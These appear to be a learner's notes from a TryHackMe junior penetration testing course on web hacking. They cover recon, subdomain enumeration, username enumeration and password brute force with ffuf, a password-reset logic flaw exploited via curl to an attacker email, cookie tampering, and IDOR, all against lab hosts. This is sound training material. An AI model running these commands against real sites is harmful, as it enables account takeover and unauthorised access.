# THM Jr Penetration Tester

# Web Hacking

## Offensive intro
Brute force website to find hidden pages and directories  
`gobuster -u http://fakebank.thm -w wordlist.txt dir`

## Defensive intro
Security Operations Center (SOC), inc. Threat Intelligence  
Digital Forensics and Incident Response (DFIR), inc. Malware Analysis

## Stages

**Information Gathering**  
This stage involves collecting as much publically accessible information about a target/organisation as possible, for example, OSINT and research.  
Note: This does not involve scanning any systems.  

**Enumeration/Scanning**  
This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable.  

**Exploitation**  
This stage involves leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic.  
  
**Privilege Escalation**  
Once you have successfully exploited a system or application (known as a foothold), this stage is the attempt to expand your access to a system. You can escalate horizontally and vertically, where horizontally is accessing another account of the same permission group (i.e. another user), whereas vertically is that of another permission group (i.e. an administrator).  

**Post-exploitation**	 
This stage involves a few sub-stages:  
1. What other hosts can be targeted (pivoting)  
2. What additional information can we gather from the host now that we are a privileged user  
3. Covering your tracks  
4. Reporting

## Web Application walkthrough
In HTML source we can find:  
- `comments` and `hidden links` in html source
- `directories` for open permissions  
- `framework version`  
- `manipulate` HTML via inspector  
- breakpoint `debugger` in js code  
- `network` information  

## Content Discovery

**Manual**  
- `robots.txt`
- `favicon` revealing the framework used (md5 sum the result and look in https://wiki.owasp.org/index.php/OWASP_favicon_database)  
- `sitemap.xml` (more URLs)  
- `curl -v` (check versions of software used)  
- `admin URL` for instance gotten from framework websites

**OSINT**  
- `site:tryhackme.com admin` Google hacking/dorking  
- `technologies` used with Wappalyzer (https://www.wappalyzer.com/)  
- The Wayback Machine `https://archive.org/web/`
- `GitHub`'s search feature to look for company names or website names
- `S3 buckets` can be discovered  

**Automated**  
- `wordlists` for passwords, directories and filenames  
- Automation tools like `ffuf, dirb and gobuster`

## Subdomain Enumeration

3 different subdomain enumeration methods: Brute Force, OSINT and Virtual Host   

**OSINT**  
-  `Certificate search` for subdomains: https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui
-  `Search engine` for subdomains: site:*.domain.com -site:www.domain.com
-  Automate search engine listing `./sublist3r.py -d acmeitsupport.thm`  

**Brute Force**
- `dnsrecon` try many domains dnsrecon -t brt -d acmeitsupport.thm

**Virtual Host**
- brute force subdomain that could be in /etc/host `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.50.172 -fs {size}`  

## Authentication Bypass

**Username Enumeration**  
- `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.239.105/customers/signup -mr "username already exists" | grep "\[Status: 200" | awk '{print $1}' > valid_usernames.txt` finds valid usernames that exists  

**Brute Force**  
- Then use common passwords: `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.239.105/customers/login -fc 200`  

**Logic Flaw**  
Playing with the fact  PHP $_REQUEST variable is an array that contains data received from the query string _AND_ POST data. We do this 2 queries:  
- `curl 'http://10.10.164.175/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`  
Create an account and then:    
- `curl 'http://10.10.164.175/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`  

**Cookie Tampering**  
- Set the cookie `curl -H "Cookie: logged_in=true; admin=true" http://10.10.164.175/cookie-test`
- `Find md5 content` by looking up DB of hashes such as ` https://crackstation.net/`  
- `Decode/Encode base64 content` i.e: {"id":1,"admin": false} becomes {"id":1,"admin": true}

## IDOR

- changing `IDs` in URLs  
- can also be done `decoding/encoding` again data in cookies, POST data and see server responses
- `https://crackstation.net/` for maybe finding the data behind IDs in this DB of billions of md5 hash to value results
- check IDOR possibilities by creating 2 accounts and then checking out each other account when logged in (or not)
- can also come from `AJAX call` and change of parameters ($.ajax({ type: "GET", url: "https://10-10-206-77.p.thmlabs.com/api/v1/customer?id=3" });)  



- 


